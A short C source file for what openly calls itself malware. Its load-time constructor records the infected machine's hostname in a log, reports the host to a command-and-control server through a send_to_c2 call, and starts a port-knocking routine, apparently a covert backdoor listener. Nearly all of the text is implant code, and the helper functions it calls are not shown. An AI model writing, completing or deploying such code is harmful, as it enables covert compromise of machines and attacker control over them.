#define _GNU_SOURCE
#include "malware.h"

__attribute__((constructor))
void init()
{
    char host[256];
    if (gethostname(host, sizeof(host)) != 0) {
        strcpy(host, "inconnu");
    }
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "Malware chargé sur : %s\n", host);
        fclose(f);
    }    
    char reg[256];
    snprintf(reg, sizeof(reg), "Host infecté: %s\n", host);
    send_to_c2(reg);
    start_port_knocking();
}
